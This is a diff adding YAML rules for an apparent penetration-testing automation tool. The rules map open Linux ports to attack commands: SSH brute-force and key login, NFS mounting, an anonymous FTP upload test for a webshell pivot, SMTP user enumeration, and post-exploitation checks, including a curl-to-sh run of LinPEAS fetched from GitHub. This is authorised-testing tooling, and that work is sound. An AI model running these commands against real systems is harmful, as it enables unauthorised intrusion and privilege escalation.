@@ -1,0 +1,137 @@
+# ─────────────────────────────────────────────────
+# Linux target rules
+# Fires when indicators suggest a Linux/Unix host
+# ─────────────────────────────────────────────────
+
+# ── SSH ──────────────────────────────────────────
+
+- id: linux_ssh_brute
+  name: SSH Brute-Force
+  description: Brute-force SSH login with known usernames and passwords.
+  priority: P2
+  conditions:
+    require_ports: [22]
+    require_state: [has_valid_user]
+  command_template: capo brute ssh -U {USERFILE} -P {PASSFILE}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+
+- id: linux_ssh_login
+  name: SSH Login with Credentials
+  description: Use discovered credentials to gain SSH access.
+  priority: P1
+  conditions:
+    require_ports: [22]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: ssh {USER}@{IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+
+- id: linux_ssh_id_rsa
+  name: SSH Private Key Login
+  description: Found credentials may include SSH keys — try key-based login.
+  priority: P1
+  conditions:
+    require_ports: [22]
+    require_state: [has_valid_user]
+    jmespath: "length(notes[?contains(note, 'id_rsa') || contains(note, 'ssh') || contains(note, 'key')]) > `0`"
+  command_template: ssh -i id_rsa {USER}@{IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+
+# ── NFS ──────────────────────────────────────────
+
+- id: linux_nfs_enum
+  name: NFS Share Enumeration
+  description: List exported NFS shares and attempt mount.
+  priority: P1
+  conditions:
+    require_ports: [2049]
+  command_template: showmount -e {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
+
+- id: linux_nfs_mount
+  name: NFS Mount & Explore
+  description: Mount an NFS share to search for sensitive files.
+  priority: P1
+  conditions:
+    require_ports: [2049]
+  command_template: mkdir -p /mnt/nfs && mount -t nfs {IP}:/ /mnt/nfs -o nolock
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
+
+# ── RPC / Portmapper ────────────────────────────
+
+- id: linux_rpcinfo
+  name: RPC Service Enumeration
+  description: Enumerate registered RPC services.
+  priority: P2
+  conditions:
+    require_ports: [111]
+  command_template: rpcinfo -p {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
+
+# ── FTP ──────────────────────────────────────────
+
+- id: linux_ftp_anon
+  name: FTP Anonymous Login
+  description: Attempt anonymous FTP login and list files.
+  priority: P1
+  conditions:
+    require_ports: [21]
+  command_template: ftp {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+
+- id: linux_ftp_upload
+  name: FTP Upload Test (Anon)
+  description: Check if anonymous user can upload files (webshell pivot).
+  priority: P1
+  conditions:
+    require_ports: [21]
+  command_template: "curl -T test.txt ftp://{IP}/ --user anonymous:anonymous"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+
+# ── SMTP ─────────────────────────────────────────
+
+- id: linux_smtp_user_enum
+  name: SMTP User Enumeration
+  description: Enumerate valid usernames via SMTP VRFY/EXPN/RCPT.
+  priority: P2
+  conditions:
+    require_ports: [25]
+  command_template: smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t {IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
+
+# ── Post-Exploitation (when shell indicators exist) ──
+
+- id: linux_linpeas
+  name: Linux Privilege Escalation Scan
+  description: Run LinPEAS to find local privesc vectors.
+  priority: P1
+  conditions:
+    jmespath: "length(credentials) > `0` && (length(ports[?port==`22`]) > `0` || length(ports[?port==`80`]) > `0`)"
+  command_template: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+  source_reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+
+- id: linux_suid_check
+  name: SUID Binary Enumeration
+  description: Find SUID/SGID binaries for privilege escalation.
+  priority: P1
+  conditions:
+    jmespath: "length(credentials) > `0` && length(ports[?port==`22`]) > `0`"
+  command_template: "find / -perm -4000 -type f 2>/dev/null"
+  source_reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid
+
+- id: linux_cronjob_check
+  name: Cron Job Inspection
+  description: Check for writable cron jobs or wildcard injection.
+  priority: P2
+  conditions:
+    jmespath: "length(credentials) > `0` && length(ports[?port==`22`]) > `0`"
+  command_template: "cat /etc/crontab && ls -la /etc/cron.* /var/spool/cron/crontabs/"
+  source_reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
+
+- id: linux_capabilities
+  name: Linux Capabilities Check
+  description: Find binaries with dangerous capabilities for privesc.
+  priority: P2
+  conditions:
+    jmespath: "length(credentials) > `0`"
+  command_template: "getcap -r / 2>/dev/null"
+  source_reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
